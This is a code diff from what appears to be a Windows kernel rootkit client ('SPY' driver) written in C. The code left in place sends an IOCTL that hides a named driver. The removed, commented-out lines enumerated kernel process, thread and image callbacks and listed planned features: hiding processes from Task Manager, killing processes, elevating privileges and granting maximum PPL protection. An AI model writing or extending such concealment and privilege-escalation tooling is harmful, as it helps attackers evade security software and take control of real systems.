@@ -147,27 +147,16 @@ int HandleDriverCommand(int argc, char* argv[], char* buffer)
         }
 
         const char* driverName = argv[3];
-        /*printf("[*] Hiding driver: %s\n\n", driverName);*/
 
         // Prepare input structure
         SPY_HIDE_INPUT input = { 0 };
         strncpy_s(input.g_Name, sizeof(input.g_Name), driverName, _TRUNCATE);
 
-        // Copy input to start of buffer, output will overwrite
         memcpy(buffer, &input, sizeof(input));
         SendIOCTL(IOCTL_SPY_DHIDE, buffer, sizeof(input), buffer, BUFFER_SIZE);
         return 0;
     }
-  //  // Action: --callback
-  //  else if (strcmp(action, "--callback") == 0) {
-  //      /*printf("[*] Enumerating kernel callbacks...\n\n");*/
-  //      SendIOCTL(IOCTL_SPY_PCALLBACK, NULL, 0, buffer, BUFFER_SIZE);
-  //      printf("\n");
-  //      SendIOCTL(IOCTL_SPY_TCALLBACK, NULL, 0, buffer, BUFFER_SIZE);
-		//printf("\n");
-  //      SendIOCTL(IOCTL_SPY_ICALLBACK, NULL, 0, buffer, BUFFER_SIZE);
-  //      return 0;
-  //  }
+
     // Unknown action
     else {
         printf("[!] Unknown driver action: %s\n", action);
@@ -185,15 +174,6 @@ int HandleProcessCommand(int argc, char* argv[], char* buffer)
     }
 
     const char* action = argv[2];
-
-    
-    /*printf("Planned actions:\n");
-    printf("  --list                      - List all processes\n");
-    printf("  --hide <pid>                - Hide process from task manager\n");
-    printf("  --kill <pid>                - Terminate process\n");
-    printf("  --elevate <pid>             - Elevate process privileges\n");
-    printf("  --ppl <pid> [-l <level>]    - Make me a PPL process & level default to the max level");
-    printf("\n");*/
 
     // Action --list
     if (strcmp(action, "--list") == 0) {
